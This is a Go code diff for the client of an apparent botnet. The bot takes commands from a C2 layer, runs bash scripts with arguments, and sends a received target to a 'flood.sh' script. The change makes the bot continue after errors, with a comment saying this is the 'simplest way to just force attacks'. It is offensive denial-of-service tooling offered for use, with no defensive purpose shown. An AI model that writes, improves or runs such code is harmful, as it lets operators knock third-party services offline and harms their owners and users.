@@ -44,39 +44,20 @@ func (b *Bot) Connect() error {
 
 // Handler function to execute local scripts depending on received signal from C2 layer
 func (b *Bot) Execute(fpath string, args string) error {
-	var errMsg string
-
 	args = strings.TrimSpace(args)
 	if args == "" {
-		errMsg = fmt.Sprintf("[×] Failed to execute %s: No args received!", fpath)
-		/* b.Conn.WriteJSON(Message{
-			Payload: errMsg,
-			From:    b.Addr,
-		}) */
-
-		return fmt.Errorf(errMsg)
+		return fmt.Errorf("[×] Failed to execute %s: No args received!", fpath)
 	}
 
 	// TODO: Also validate valid address
 
 	cmd := exec.Command("bash", fpath, args)
 	if output, err := cmd.CombinedOutput(); err != nil {
-		errMsg = fmt.Sprintf("[×] Failed during exection of %s: %s\n%s", fpath, err, output)
-		/* b.Conn.WriteJSON(Message{
-			Payload: errMsg,
-			From:    b.Addr,
-		}) */
-
-		return fmt.Errorf(errMsg)
+		log.Printf("[×] Failed during exection of %s: %s", fpath, output)
+		return err
 	}
 
-	successMsg := fmt.Sprintf("[✓] Executed %s! Args: %s", fpath, args)
-	log.Printf(successMsg)
-	/* b.Conn.WriteJSON(Message{
-		Payload: successMsg,
-		From:    b.Addr,
-	}) */
-
+	log.Printf("[✓] Executed %s! Args: %s", fpath, args)
 	return nil
 }
 
@@ -110,8 +91,9 @@ func (b *Bot) Listen() error {
 
 					default:
 						if err := b.Execute("/app/bot/flood.sh", target); err != nil { // NOTE: absolute path within container
-							log.Printf(err.Error())
-							return // TODO: Get status code, keep trying if 429
+							// log.Printf(err.Error()) // Commented out to reduce noise in terminal
+
+							continue // Simplest way to just force attacks
 						}
 					}
 				}
